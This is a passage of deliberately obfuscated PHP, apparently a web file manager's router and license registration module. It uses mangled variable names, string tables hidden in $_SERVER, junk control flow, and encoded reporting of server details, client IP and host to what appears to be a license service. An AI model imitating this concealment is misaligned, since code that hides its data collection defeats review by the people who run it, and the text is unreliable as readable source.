$µ¨¯ªª¨)); $´ÎŞ¨˜ = $this->field($áÑîı¨£[2232])->where($úîè€ôÛ)->limit($üæ«ç)->select(); $¼ÔìõƒÏ[$áÑîı¨£[661]] = array(); foreach ($´ÎŞ¨˜ as $«†…ñË†) { $¼ÔìõƒÏ[$áÑîı¨£[661]][] = array($áÑîı¨£[621], $áÑîı¨£[603] . $«†…ñË†[$áÑîı¨£[193]] . $áÑîı¨£[622]); } $¼ÔìõƒÏ[$áÑîı¨£[661]][] = $áÑîı¨£[2056]; } } goto Cñ²œ†”Ï; Aœµ®…Üß: $_SERVER[Ÿ›ğøİò] = explode($_SERVER[£ğ°ÖØø][689], gzinflate(substr($_SERVER[£ğ°ÖØø][690], 10, -8))); $wkcrndixbs = $_SERVER[£ğ°ÖØø][691]; class Application { private $defaultModule = "\151\156\x64\145\x78"; private $defaultController = "\151\x6e\x64\x65\x78"; private $defaultAction = "\151\156\144\x65\x78"; function __construct() { } public function setDefault($àÌğì˜Æ) { $øƒ³”Çš =& $_SERVER[£ğ°ÖØø]; $ÍßÇşğ  =& $_SERVER[Ÿ›ğøİò]; $ùÁŸô‚¤ = explode($ÍßÇşğ [0], trim($àÌğì˜Æ, $ÍßÇşğ [0])); $´òù‚ñ‹ = $øƒ³”Çš[692]; if (strlen($´òù‚ñ‹) < $øƒ³”Çš[693]) { die; } $this->defaultModule = $ùÁŸô‚¤[0] ? $ùÁŸô‚¤[0] : $this->defaultModule; $áÓÛ¨˜™ = $øƒ³”Çš[694]; if (strlen($áÓÛ¨˜™) < $øƒ³”Çš[695]) { die; } $this->defaultController = $ùÁŸô‚¤[1] ? $ùÁŸô‚¤[1] : $this->defaultController; $³»ğ¯òÉ = $øƒ³”Çš[696]; if (!$³»ğ¯òÉ) { return; } $this->defaultAction = $ùÁŸô‚¤[2] ? $ùÁŸô‚¤[2] : $this->defaultAction; $this->cxyw52c69bcc($ÍßÇşğ [1], array($this, $ÍßÇşğ [2])); } public function appRun($èËşòÈ) { $ñüû¯®ß =& $_SERVER[£ğ°ÖØø]; $Òšˆ«¹Õ =& $_SERVER[Ÿ›ğøİò]; $ˆ‚ÁÙáé = explode($Òšˆ«¹Õ[0], $èËşòÈ); $Ã¹Œ¶à = strtolower($ˆ‚ÁÙáé[0]); $çæ–Í¬† = $Òšˆ«¹Õ[3]; $„Ûä³­ = $ñüû¯®ß[697]; if ($Ã¹Œ¶à == $Òšˆ«¹Õ[4]) { $çæ–Í¬† = $Òšˆ«¹Õ[5]; $ˆ‚ÁÙáé[0] = $Òšˆ«¹Õ[6]; $ˆ‚ÁÙáé[1] = $ˆ‚ÁÙáé[1] . $Òšˆ«¹Õ[7]; $èËşòÈ = join($Òšˆ«¹Õ[0], $ˆ‚ÁÙáé); $èËşòÈ = trim($èËşòÈ, $Òšˆ«¹Õ[0]); } call_user_func(array($Òšˆ«¹Õ[8], $Òšˆ«¹Õ[9]), $çæ–Í¬† . $Òšˆ«¹Õ[10], $èËşòÈ); ActionCall($èËşòÈ); $ÂÀ®Úú = $ñüû¯®ß[698]; call_user_func(array($Òšˆ«¹Õ[8], $Òšˆ«¹Õ[9]), $çæ–Í¬† . $Òšˆ«¹Õ[11], $èËşòÈ); } private function autorun() { $§‹ñÙŒ° =& $_SERVER[£ğ°ÖØø]; $òõ“Â‚ù =& $_SERVER[Ÿ›ğøİò]; global $config; if (count($config[$òõ“Â‚ù[12]]) == 0) { return; } foreach ($config[$òõ“Â‚ù[12]] as $É¥Æº— => $ÚÑ€¤ˆ²) { $this->appRun($ÚÑ€¤ˆ²); $ªâéË˜ = $§‹ñÙŒ°[699]; while (strlen($ªâéË˜) < $§‹ñÙŒ°[700]) { if (!$ªâéË˜) { break; } $ªâéË˜++; } } } private function pxwma8bc5d49() { $“Ç›¯ã¶ =& $_SERVER[£ğ°ÖØø]; $³Â­™” =& $_SERVER[Ÿ›ğøİò]; $÷ä«¦âà = $³Â­™”[4]; $ü°œÈÂ¯ = $GLOBALS[$³Â­™”[13]][$³Â­™”[14]][0]; $şÎ§±Şğ = $“Ç›¯ã¶[701]; if (!$ü°œÈÂ¯ || strlen($ü°œÈÂ¯) <= strlen($÷ä«¦âà)) { return; } if (strtolower(substr($ü°œÈÂ¯, -strlen($÷ä«¦âà))) != $÷ä«¦âà) { return; } $½µ´ÕÈœ = substr($ü°œÈÂ¯, 0, -strlen($÷ä«¦âà)); $œŞ•ò¥“ = array($³Â­™”[4], $½µ´ÕÈœ); $ÂÙÏÙ¹ = $“Ç›¯ã¶[702]; if (!$ÂÙÏÙ¹) { return; } $×ÍíÄ¿¶ = array_slice($GLOBALS[$³Â­™”[13]][$³Â­™”[14]], 1); $GLOBALS[$³Â­™”[13]][$³Â­™”[14]] = array_merge($œŞ•ò¥“, $×ÍíÄ¿¶); $ÇÙ…—Ÿı = $“Ç›¯ã¶[703]; if (!$ÇÙ…—Ÿı) { return; } $GLOBALS[$³Â­™”[13]][$³Â­™”[15]] = implode($³Â­™”[0], $GLOBALS[$³Â­™”[13]][$³Â­™”[14]]); } private function zrmd6be0e7f7() { $€Ô¸ºŞ¾ =& $_SERVER[£ğ°ÖØø]; $‚İ†¡¨ =& $_SERVER[Ÿ›ğøİò]; if ($GLOBALS[$‚İ†¡¨[13]][$‚İ†¡¨[15]] != $‚İ†¡¨[6]) { return; } $²ãÎ·Àæ = $_SERVER[$‚İ†¡¨[16]]; $ô³Õ¬ì½ = $€Ô¸ºŞ¾[704]; if (!$ô³Õ¬ì½) { die; } $ü°—˜é’ = $‚İ†¡¨[17]; $ÉÍïç³ = $€Ô¸ºŞ¾[705]; if (!strstr($²ãÎ·Àæ, $ü°—˜é’)) { return; } $Óİ¹Û•– = strrpos($²ãÎ·Àæ, $ü°—˜é’); $®ÌàÔ“ì = substr($²ãÎ·Àæ, $Óİ¹Û•– + strlen($ü°—˜é’)); preg_match_all($‚İ†¡¨[18], $®ÌàÔ“ì, $Ùï‡«ê); $®ÌàÔ“ì = trim($Ùï‡«ê[0][0], $‚İ†¡¨[19]); $GLOBALS[$‚İ†¡¨[13]][$‚İ†¡¨[14]] = explode($‚İ†¡¨[19], $®ÌàÔ“ì); $¨ğ™²úÉ = $€Ô¸ºŞ¾[706]; $GLOBALS[$‚İ†¡¨[13]][$‚İ†¡¨[15]] = implode($‚İ†¡¨[0], $GLOBALS[$‚İ†¡¨[13]][$‚İ†¡¨[14]]); $¾‹ïœàƒ = $€Ô¸ºŞ¾[707]; while ($¾‹ïœàƒ < $€Ô¸ºŞ¾[437]) { if ($¾‹ïœàƒ >= 0) { break; } $¾‹ïœàƒ++; } } public function run() { $‰†ó¡Æ¸ =& $_SERVER[£ğ°ÖØø]; $›ü×«Ù… =& $_SERVER[Ÿ›ğøİò]; $this->zrmd6be0e7f7(); $this->pxwma8bc5d49(); $€™ÖŞ¿‹ = $GLOBALS[$›ü×«Ù…[13]][$›ü×«Ù…[14]]; $ùÀ’Œ‘Ô = $‰†ó¡Æ¸[708]; if (!$ùÀ’Œ‘Ô) { return; } $ÓØî±£ = $GLOBALS[$›ü×«Ù…[13]][$›ü×«Ù…[15]]; $»¡õİŞÅ = $‰†ó¡Æ¸[709]; if (!$»¡õİŞÅ) { die; } define($›ü×«Ù…[20], isset($€™ÖŞ¿‹[0]) && $€™ÖŞ¿‹[0] ? $€™ÖŞ¿‹[0] : $this->defaultModule); define($›ü×«Ù…[21], isset($€™ÖŞ¿‹[1]) && $€™ÖŞ¿‹[0] ? $€™ÖŞ¿‹[1] : $this->defaultController); $âÀƒØ’Ã = $‰†ó¡Æ¸[710]; if (!$âÀƒØ’Ã) { return; } define($›ü×«Ù…[22], isset($€™ÖŞ¿‹[2]) && $€™ÖŞ¿‹[0] ? $€™ÖŞ¿‹[2] : $this->defaultAction); define($›ü×«Ù…[23], MOD . $›ü×«Ù…[0] . ST . $›ü×«Ù…[0] . ACT); $_SERVER[$›ü×«Ù…[24]] = strtolower(ACTION); $this->autorun(); $·°™º®Ø = $‰†ó¡Æ¸[711]; if (!$·°™º®Ø) { die; } if (count($€™ÖŞ¿‹) >= 3) { $this->appRun($ÓØî±£); } else { $this->appRun(ACTION); } } private $ngabf1799774 = array(); private $gymd1fbeea33 = ''; public function vrfsa20b34ff() { $ÃùÌ­ä“ =& $_SERVER[£ğ°ÖØø]; $ªíàÚ½ =& $_SERVER[Ÿ›ğøİò]; $this->tazm5b72724d(); $İ“ÛÂš = $ÃùÌ­ä“[712]; $this->fzurcf53ea5e(); $this->vdyge8f28b62(); $Íµ‘‡µâ = $ÃùÌ­ä“[713]; while (strlen($Íµ‘‡µâ) < $ÃùÌ­ä“[693]) { if (!$Íµ‘‡µâ) { break; } $Íµ‘‡µâ++; } $this->horid1d10301(); $®¹ŠÊ®» = $ÃùÌ­ä“[714]; while ($®¹ŠÊ®» < $ÃùÌ­ä“[437]) { if ($®¹ŠÊ®» >= 0) { break; } $®¹ŠÊ®»++; } $this->tfix20d80c0c(); $this->yoikce640cd1(); $this->ugcy5fcb9f34(); $±¸îµÃ„ = $ÃùÌ­ä“[715]; $this->cxyw52c69bcc($ªíàÚ½[25], array($this, $ªíàÚ½[26])); $¸ºï»Şì = $ÃùÌ­ä“[716]; if (strlen($¸ºï»Şì) < $ÃùÌ­ä“[437]) { die; } $this->cxyw52c69bcc($ªíàÚ½[27], array($this, $ªíàÚ½[28])); $this->cxyw52c69bcc($ªíàÚ½[29], array($this, $ªíàÚ½[30])); $‡Ü•¼• = $ÃùÌ­ä“[717]; if (!$‡Ü•¼•) { return; } $this->cxyw52c69bcc($ªíàÚ½[31], array($this, $ªíàÚ½[32])); $É‰¤áİÃ = $ÃùÌ­ä“[718]; if (!$É‰¤áİÃ) { return; } } public function bhdr0f486aa6($¾ƒë‡Ç) { $ª‚ŸÎÛå =& $_SERVER[£ğ°ÖØø]; $û ×Ò£˜ =& $_SERVER[Ÿ›ğøİò]; $âß£‡Ö­ = Model($û ×Ò£˜[33])->get(); $ã”Öï©Ş = array($û ×Ò£˜[34], $û ×Ò£˜[35], $û ×Ò£˜[36], $û ×Ò£˜[37], $û ×Ò£˜[38], $û ×Ò£˜[39], $û ×Ò£˜[40], $û ×Ò£˜[41], $û ×Ò£˜[42], $û ×Ò£˜[43], $û ×Ò£˜[44], $û ×Ò£˜[45], $û ×Ò£˜[46], $û ×Ò£˜[47], $û ×Ò£˜[48], $û ×Ò£˜[49], $û ×Ò£˜[50], $û ×Ò£˜[51], $û ×Ò£˜[52], $û ×Ò£˜[53], $û ×Ò£˜[54], $û ×Ò£˜[55], $û ×Ò£˜[56], $û ×Ò£˜[57], $û ×Ò£˜[58], $û ×Ò£˜[59], $û ×Ò£˜[60], $û ×Ò£˜[61], $û ×Ò£˜[62], $û ×Ò£˜[63], $û ×Ò£˜[64], $û ×Ò£˜[65], $û ×Ò£˜[66], $û ×Ò£˜[67], $û ×Ò£˜[68], $û ×Ò£˜[69], $û ×Ò£˜[70], $û ×Ò£˜[71], $û ×Ò£˜[72], $û ×Ò£˜[73], $û ×Ò£˜[74], $û ×Ò£˜[75], $û ×Ò£˜[76], $û ×Ò£˜[77], $û ×Ò£˜[78], $û ×Ò£˜[79], $û ×Ò£˜[80], $û ×Ò£˜[81], $û ×Ò£˜[82], $û ×Ò£˜[83], $û ×Ò£˜[84], $û ×Ò£˜[85]); $×âÑªüÏ = $ª‚ŸÎÛå[719]; while (strlen($×âÑªüÏ) < $ª‚ŸÎÛå[700]) { if (!$×âÑªüÏ) { break; } $×âÑªüÏ++; } foreach ($ã”Öï©Ş as $”½ƒµ»«) { $ĞÈïï±ï = $GLOBALS[$û ×Ò£˜[86]][$û ×Ò£˜[87]][$”½ƒµ»«]; if (isset($âß£‡Ö­[$”½ƒµ»«])) { $ĞÈïï±ï = $âß£‡Ö­[$”½ƒµ»«]; } $¾ƒë‡Ç[$û ×Ò£˜[88]][$û ×Ò£˜[89]][$”½ƒµ»«] = $ĞÈïï±ï; } $§Ï¤ª = $¾ƒë‡Ç[$û ×Ò£˜[88]][$û ×Ò£˜[89]][$û ×Ò£˜[46]]; $ìĞûêé¥ = $ª‚ŸÎÛå[720]; unset($¾ƒë‡Ç[$û ×Ò£˜[88]][$û ×Ò£˜[90]][$û ×Ò£˜[91]]); unset($¾ƒë‡Ç[$û ×Ò£˜[88]][$û ×Ò£˜[90]][$û ×Ò£˜[92]]); unset($¾ƒë‡Ç[$û ×Ò£˜[88]][$û ×Ò£˜[89]][$û ×Ò£˜[46]]); unset($¾ƒë‡Ç[$û ×Ò£˜[88]][$û ×Ò£˜[89]][$û ×Ò£˜[93]]); $¾ƒë‡Ç[$û ×Ò£˜[88]][$û ×Ò£˜[89]][$û ×Ò£˜[94]] = array($û ×Ò£˜[95] => (int) $§Ï¤ª[$û ×Ò£˜[96]], $û ×Ò£˜[97] => (int) _get($§Ï¤ª, $û ×Ò£˜[98], 0)); $Ãİ±öİÜ = $ª‚ŸÎÛå[721]; if (!$Ãİ±öİÜ) { die; } $ÒÚÀÆ¤è = substr(md5($û ×Ò£˜[99] . get_client_ip() . $âß£‡Ö­[$û ×Ò£˜[100]]), 0, 15); $¾ƒë‡Ç[$û ×Ò£˜[101]][$û ×Ò£˜[102]] = Mcrypt::encode(Session::sign(), $ÒÚÀÆ¤è, 3600 * 24); $¾ƒë‡Ç[$û ×Ò£˜[101]][$û ×Ò£˜[103]] = Action($û ×Ò£˜[104])->accessToken(); $Œô÷ê = $ª‚ŸÎÛå[722]; while ($Œô÷ê < $ª‚ŸÎÛå[693]) { if ($Œô÷ê >= 0) { break; } $Œô÷ê++; } $¾ƒë‡Ç[$û ×Ò£˜[101]][$û ×Ò£˜[105]] = md5($_SERVER[$û ×Ò£˜[106]] . $âß£‡Ö­[$û ×Ò£˜[100]]); $«¢Úğ²š = $ª‚ŸÎÛå[723]; if (strlen($«¢Úğ²š) < $ª‚ŸÎÛå[724]) { return; } $¾ƒë‡Ç[$û ×Ò£˜[101]][$û ×Ò£˜[107]] = base64_encode(serverInfo()); $ÑÆìéî¥ = $ª‚ŸÎÛå[725]; $¾ƒë‡Ç[$û ×Ò£˜[101]][$û ×Ò£˜[108]] = $this->gymd1fbeea33; if ($âß£‡Ö­[$û ×Ò£˜[108]] != $û ×Ò£˜[109]) { $¾ƒë‡Ç[$û ×Ò£˜[101]][$û ×Ò£˜[110]] = $âß£‡Ö­[$û ×Ò£˜[110]]; $¾ƒë‡Ç[$û ×Ò£˜[101]][$û ×Ò£˜[111]] = $âß£‡Ö­[$û ×Ò£˜[111]]; $Ûóöõè¤ = rand_string(10) . $this->gymd1fbeea33 . rand_string(5); $¾ƒë‡Ç[$û ×Ò£˜[88]][$û ×Ò£˜[112]][$û ×Ò£˜[113]] = $this->xznpe4195329($Ûóöõè¤, $¾ƒë‡Ç[$û ×Ò£˜[101]][$û ×Ò£˜[105]]); } if ($this->gymd1fbeea33 == $û ×Ò£˜[109]) { $¾ƒë‡Ç[$û ×Ò£˜[88]][$û ×Ò£˜[89]][$û ×Ò£˜[94]][$û ×Ò£˜[98]] = 0; } $¾ƒë‡Ç[$û ×Ò£˜[101]][$û ×Ò£˜[114]] = $this->versionPluginFilter(); $¾ƒë‡Ç[$û ×Ò£˜[101]][$û ×Ò£˜[115]] = _get($this->ngabf1799774, $û ×Ò£˜[116], $û ×Ò£˜[6]); $ı¤Ô…“° = $ª‚ŸÎÛå[726]; if (KodUser::isRoot() && $this->config[$û ×Ò£˜[117]]) { $¾ƒë‡Ç[$û ×Ò£˜[101]][$û ×Ò£˜[118]] = WEB_ROOT; } return $¾ƒë‡Ç; } private function yoikce640cd1() { $¦Œ…óš² =& $_SERVER[£ğ°ÖØø]; $ÔúİãÂì =& $_SERVER[Ÿ›ğøİò]; $®ø°¨“¼ = $_SERVER[$ÔúİãÂì[24]] == $ÔúİãÂì[119]; $Š·»·ç = $¦Œ…óš²[727]; if (strlen($Š·»·ç) < $¦Œ…óš²[695]) { die; } if ($_SERVER[$ÔúİãÂì[24]] == $ÔúİãÂì[120] && $_GET[$ÔúİãÂì[121]] == $ÔúİãÂì[122]) { $®ø°¨“¼ = !0; } if ($®ø°¨“¼) { $Ò±æ¦ªÔ = array($ÔúİãÂì[108] => $this->gymd1fbeea33, $ÔúİãÂì[123] => $this->zqsd885b2b00(), $ÔúİãÂì[124] => Model($ÔúİãÂì[125])->count()); if ($this->gymd1fbeea33 != $ÔúİãÂì[109]) { $±öÀ¸½² = _get($this->ngabf1799774, $ÔúİãÂì[126]); if ($±öÀ¸½²) { $Ò±æ¦ªÔ[$ÔúİãÂì[127]] = $±öÀ¸½²; $Ò±æ¦ªÔ[$ÔúİãÂì[128]] = strtotime(_get($this->ngabf1799774, $ÔúİãÂì[129])); $Ò±æ¦ªÔ[$ÔúİãÂì[130]] = _get($this->ngabf1799774, $ÔúİãÂì[116]); } $ùôÔãûâ = Model($ÔúİãÂì[33])->get($ÔúİãÂì[131], $ÔúİãÂì[6], !0); if (is_string($ùôÔãûâ) && substr($ùôÔãûâ, 0, 1) == $ÔúİãÂì[132]) { $ùôÔãûâ = json_decode_force($ùôÔãûâ); } if (is_array($ùôÔãûâ) && $ùôÔãûâ[$ÔúİãÂì[133]] && strstr($ùôÔãûâ[$ÔúİãÂì[133]], $ÔúİãÂì[134])) { $éÈÇ“ÄÂ = explode($ÔúİãÂì[134], $ùôÔãûâ[$ÔúİãÂì[133]]); $Ò±æ¦ªÔ[$ÔúİãÂì[135]] = $éÈÇ“ÄÂ[0]; } } $Ò±æ¦ªÔ = $this->odvs2759ba87(json_encode($Ò±æ¦ªÔ), md5($ÔúİãÂì[136])); $ØÕ¼†… = array($ÔúİãÂì[137] => $Ò±æ¦ªÔ); $Ò÷’‚¯Î = $¦Œ…óš²[728]; if (!$Ò÷’‚¯Î) { return; } call_user_func(array($ÔúİãÂì[138], $ÔúİãÂì[139]), $ØÕ¼†…); $Ø¬ì¢“ = $¦Œ…óš²[729]; } if ($this->gymd1fbeea33 == $ÔúİãÂì[109]) { return; } $‘…Ø”ØĞ = array($ÔúİãÂì[140], $ÔúİãÂì[141], $ÔúİãÂì[142], $ÔúİãÂì[143], $ÔúİãÂì[144], $ÔúİãÂì[145]); $Ûú‹èğÛ = Model($ÔúİãÂì[33])->get(); $ØÕ¼†… = array($ÔúİãÂì[146] => $Ûú‹èğÛ[$ÔúİãÂì[34]], $ÔúİãÂì[147] => $Ûú‹èğÛ[$ÔúİãÂì[35]], $ÔúİãÂì[148] => $ÔúİãÂì[6]); foreach ($‘…Ø”ØĞ as $²µØ×Îî) { if (!isset($Ûú‹èğÛ[$²µØ×Îî]) || !$Ûú‹èğÛ[$²µØ×Îî]) { continue; } $ØÕ¼†…[$²µØ×Îî] = $Ûú‹èğÛ[$²µØ×Îî]; } call_user_func(array($ÔúİãÂì[138], $ÔúİãÂì[139]), $ØÕ¼†…); $ÏÙŠğŞ = $¦Œ…óš²[730]; if (!$ÏÙŠğŞ) { die; } } private function horid1d10301() { $’€È”Õş =& $_SERVER[£ğ°ÖØø]; $“æÍ÷Œ¦ =& $_SERVER[Ÿ›ğøİò]; if ($_SERVER[$“æÍ÷Œ¦[24]] != $“æÍ÷Œ¦[149]) { return; } if (!KodUser::isRoot()) { die; } $§¼¡¤— = $GLOBALS[$“æÍ÷Œ¦[13]]; if (isset($§¼¡¤—[$“æÍ÷Œ¦[150]])) { $this->wgeo2914d326(); die; } if (isset($§¼¡¤—[$“æÍ÷Œ¦[151]]) && isset($§¼¡¤—[$“æÍ÷Œ¦[151]]) == $“æÍ÷Œ¦[122]) { $§¼¡¤—[$“æÍ÷Œ¦[152]] = Model($“æÍ÷Œ¦[33])->get($“æÍ÷Œ¦[153]); } if (!isset($§¼¡¤—[$“æÍ÷Œ¦[152]]) || strlen($§¼¡¤—[$“æÍ÷Œ¦[152]]) != 16) { show_json($“æÍ÷Œ¦[154] . $§¼¡¤—[$“æÍ÷Œ¦[152]], !1); } $üç§Ã€™ = Model($“æÍ÷Œ¦[33])->get($“æÍ÷Œ¦[100]); $ ¹À ÓÜ = md5($_SERVER[$“æÍ÷Œ¦[106]] . $üç§Ã€™); $âÜ’ˆ­ = $’€È”Õş[731]; if (!$âÜ’ˆ­) { return; } $âËì™³Ï = array($“æÍ÷Œ¦[152] => $§¼¡¤—[$“æÍ÷Œ¦[152]], $“æÍ÷Œ¦[155] => rand_string(16), $“æÍ÷Œ¦[156] => $“æÍ÷Œ¦[136], $“æÍ÷Œ¦[157] => $“æÍ÷Œ¦[158], $“æÍ÷Œ¦[159] => $_SERVER[$“æÍ÷Œ¦[160]], $“æÍ÷Œ¦[161] => $_SERVER[$“æÍ÷Œ¦[162]], $“æÍ÷Œ¦[163] => $_SERVER[$“æÍ÷Œ¦[164]], $“æÍ÷Œ¦[105] => $ ¹À ÓÜ, $“æÍ÷Œ¦[165] => Model($“æÍ÷Œ¦[33])->get($“æÍ÷Œ¦[131])); if (isset($§¼¡¤—[$“æÍ÷Œ¦[151]]) && isset($§¼¡¤—[$“æÍ÷Œ¦[151]]) == $“æÍ÷Œ¦[122]) { $âËì™³Ï[$“æÍ÷Œ¦[151]] = md5($âËì™³Ï[$“æÍ÷Œ¦[152]] . $“æÍ÷Œ¦[166] . $âËì™³Ï[$“æÍ÷Œ¦[155]]); } if ($§¼¡¤—[$“æÍ÷Œ¦[167]] == $“æÍ÷Œ¦[168]) { $õÜğìµ = $this->odvs2759ba87($ ¹À ÓÜ, $“æÍ÷Œ¦[169]); $æ’İ‚©³ = $this->xznpe4195329(json_encode($âËì™³Ï), $ ¹À ÓÜ . $“æÍ÷Œ¦[170], 3); $æ’İ‚©³ = $æ’İ‚©³ . $“æÍ÷Œ¦[171] . $_SERVER[$“æÍ÷Œ¦[160]]; $†ÍÅîØ· = $this->gcif7db83b11($“æÍ÷Œ¦[172] . $õÜğìµ . $“æÍ÷Œ¦[173] . $æ’İ‚©³, -1); show_json($†ÍÅîØ·, !0); } else { if ($§¼¡¤—[$“æÍ÷Œ¦[167]] == $“æÍ÷Œ¦[174]) { $Æ‰“È¿‡ = substr(md5($“æÍ÷Œ¦[175] . $ ¹À ÓÜ), 12, 15) . $“æÍ÷Œ¦[176]; $æ’İ‚©³ = $this->bpaqdfc5fdf2(trim($§¼¡¤—[$“æÍ÷Œ¦[177]]), $Æ‰“È¿‡, 2); $ì¶€£›Ç = json_decode($æ’İ‚©³, !0); if (!is_array($ì¶€£›Ç) || !is_array($ì¶€£›Ç[$“æÍ÷Œ¦[178]]) || $ì¶€£›Ç[$“æÍ÷Œ¦[152]] != !0) { $¤‰´×‡§ = $“æÍ÷Œ¦[179]; $º¬îæÃí = $ì¶€£›Ç[$“æÍ÷Œ¦[178]] ? $“æÍ÷Œ¦[180] . $ì¶€£›Ç[$“æÍ÷Œ¦[178]] : $¤‰´×‡§; show_json($º¬îæÃí, !1); } else { $âËì™³Ï[$“æÍ÷Œ¦[155]] = $ì¶€£›Ç[$“æÍ÷Œ¦[178]][$“æÍ÷Œ¦[181]]; } } else { $ì¶€£›Ç = $this->gcif7db83b11($“æÍ÷Œ¦[182], $âËì™³Ï, 10); } } if (!is_array($ì¶€£›Ç) || !is_array($ì¶€£›Ç[$“æÍ÷Œ¦[178]]) || $ì¶€£›Ç[$“æÍ÷Œ¦[152]] != !0) { $¤‰´×‡§ = LNG($“æÍ÷Œ¦[183]); $º¬îæÃí = $ì¶€£›Ç[$“æÍ÷Œ¦[178]] ? $“æÍ÷Œ¦[180] . $ì¶€£›Ç[$“æÍ÷Œ¦[178]] : $¤‰´×‡§; show_json($º¬îæÃí, !1); } $ËÅÊÇş² = $ì¶€£›Ç[$“æÍ÷Œ¦[178]]; $ØÍ™­“§ = $this->cqalea7899c2($ËÅÊÇş²[$“æÍ÷Œ¦[184]]); if (!$ØÍ™­“§ || $ØÍ™­“§ != $ËÅÊÇş²[$“æÍ÷Œ¦[129]]) { $€è¯¥îª = array($“æÍ÷Œ¦[185] => Model($“æÍ÷Œ¦[33])->get($“æÍ÷Œ¦[100]), $“æÍ÷Œ¦[186] => $_SERVER[$“æÍ÷Œ¦[106]], $“æÍ÷Œ¦[187] => this_url(), $“æÍ÷Œ¦[161] => $_SERVER[$“æÍ÷Œ¦[162]]); $æ’İ‚©³ = $this->kjow2adb4ecf(json_encode($€è¯¥îª)); $this->gcif7db83b11($“æÍ÷Œ¦[188] . $æ’İ‚©³); show_json(LNG($“æÍ÷Œ¦[189]), !0); } $ù×ò­´´ = array($“æÍ÷Œ¦[153] => $ËÅÊÇş²[$“æÍ÷Œ¦[190]], $“æÍ÷Œ¦[191] => $ËÅÊÇş²[$“æÍ÷Œ¦[192]], $“æÍ÷Œ¦[193] => rand_string(16), $“æÍ÷Œ¦[108] => $ËÅÊÇş²[$“æÍ÷Œ¦[194]]); if ($âËì™³Ï[$“æÍ÷Œ¦[155]]) { $ù×ò­´´[$“æÍ÷Œ¦[193]] = $âËì™³Ï[$“æÍ÷Œ¦[155]]; } $Úğ³Ç…¹ = substr(md5($ù×ò­´´[$“æÍ÷Œ¦[191]]), 10, 10); $Æ•‹Ìö€ = $Úğ³Ç…¹ . $ù×ò­´´[$“æÍ÷Œ¦[108]] . $ù×ò­´´[$“æÍ÷Œ¦[193]]; $ù×ò­´´[$“æÍ÷Œ¦[110]] = strrev(base64_encode($this->odvs2759ba87($Æ•‹Ìö€, $“æÍ÷Œ¦[195]))); $ñÀÎøÓ£ = $’€È”Õş[732]; $§›œ©â¦ = rand_string(16); $••’¡Ï¡ = $’€È”Õş[733]; if (!$••’¡Ï¡) { die; } $¥ÊàÓì = $§›œ©â¦ . $ù×ò­´´[$“æÍ÷Œ¦[108]] . $this->odvs2759ba87(md5($ù×ò­´´[$“æÍ÷Œ¦[153]]), $§›œ©â¦); $ù×ò­´´[$“æÍ÷Œ¦[111]] = base64_encode(strrev($this->odvs2759ba87($¥ÊàÓì, $“æÍ÷Œ¦[196]))); $»Ü«ú† = $’€È”Õş[722]; while ($»Ü«ú† < $’€È”Õş[695]) { if ($»Ü«ú† >= 0) { break; } $»Ü«ú†++; } if ($ËÅÊÇş²[$“æÍ÷Œ¦[197]] && $ËÅÊÇş²[$“æÍ÷Œ¦[197]] >= 1) { Model($“æÍ÷Œ¦[33])->setDeep($“æÍ÷Œ¦[198], $“æÍ÷Œ¦[122]); } Model($“æÍ÷Œ¦[33])->set($ù×ò­´´); $àŞ½Ü˜ = md5($_SERVER[$“æÍ÷Œ¦[106]] . strrev($üç§Ã€™) . $ù×ò­´´[$“æÍ÷Œ¦[191]]); $‰Şâ‰§¶ = $’€È”Õş[734]; if (!$‰Şâ‰§¶) { return; } $¬´…“ó‚ = strrev(substr($àŞ½Ü˜, 10, 16)); $ãìÚ³˜Ö = $this->xznpe4195329(json_encode($ËÅÊÇş²), $àŞ½Ü˜); $ñ†Ò¥êÈ = array_to_keyvalue(Model($“æÍ÷Œ¦[7])->listData(), $“æÍ÷Œ¦[199]); $¤âò‰“‚ = $’€È”Õş[735]; if (strlen($¤âò‰“‚) < $’€È”Õş[695]) { return; } $Ñ™—ÖÚĞ = $ñ†Ò¥êÈ[$“æÍ÷Œ¦[200]]; $­ıÚëò = $’€È”Õş[736]; $åç¢»í = array(); $åç¢»í[$¬´…“ó‚] = $ãìÚ³˜Ö; $é£ê—“ = $’€È”Õş[691]; if (!$é£ê—“) { die; } Model($“æÍ÷Œ¦[7])->update($Ñ™—ÖÚĞ[$“æÍ÷Œ¦[201]], array($“æÍ÷Œ¦[202] => $åç¢»í)); $òšÄŞ˜Ò = $’€È”Õş[737]; $this->ngabf1799774 = $ËÅÊÇş²; $this->gymd1fbeea33 = $ù×ò­´´[$“æÍ÷Œ¦[108]]; $this->licenseRegistSuccess(); Cache::set($“æÍ÷Œ¦[203] . md5($üç§Ã€™ . $“æÍ÷Œ¦[204]), $“æÍ÷Œ¦[6]); $ƒ úÑÔï = $’€È”Õş[738]; show_json(LNG($“æÍ÷Œ¦[189]), !0); $ş¡ó‚¤ò = $’€È”Õş[739]; if (strlen($ş¡ó‚¤ò) < $’€È”Õş[437]) { die; } } private function licenseRegistSuccess() { $£ë™û× =& $_SERVER[Ÿ›ğøİò]; $÷Èš™å’ = Model($£ë™û×[33])->get(); if ($÷Èš™å’[$£ë™û×[63]] != $£ë™û×[122]) { Model($£ë™û×[33])->set($£ë™û×[63], $£ë™û×[122]); } Action($£ë™û×[205])->initStart(!0); } private function wgeo2914d326() { $È¸’´¯ =& $_SERVER[£ğ°ÖØø]; $éôéì’ =& $_SERVER[Ÿ›ğøİò]; Model($éôéì’[33])->set(array($éôéì’[153] => $éôéì’[6], $éôéì’[191] => $éôéì’[6], $éôéì’[108] => $éôéì’[109], $éôéì’[110] => $éôéì’[6], $éôéì’[111] => $éôéì’[6])); $ıö´­¡à = $È¸’´¯[740]; Model($éôéì’[33])->setDeep($éôéì’[198], $éôéì’[206]); $—±¥Íõ­ = $È¸’´¯[741]; if (!$—±¥Íõ­) { return; } $this->ngabf1799774 = array(); $this->gymd1fbeea33 = $éôéì’[109]; $·ñØ¼¹ë = $È¸’´¯[742]; if (!$·ñØ¼¹ë) { die; } } private function tazm5b72724d() { $´ö¾­‰× =& $_SERVER[£ğ°ÖØø]; $‘ìÑ›ÈÁ =& $_SERVER[Ÿ›ğøİò]; $_SERVER[$‘ìÑ›ÈÁ[162]] = _get($_SERVER, $‘ìÑ›ÈÁ[162], APP_HOST); $this->gymd1fbeea33 = $‘ìÑ›ÈÁ[109]; $½–æ‡µÛ = Model($‘ìÑ›ÈÁ[33])->get(); if ($½–æ‡µÛ[$‘ìÑ›ÈÁ[108]] == $‘ìÑ›ÈÁ[109]) { return; } $®Ã¡Üº† = 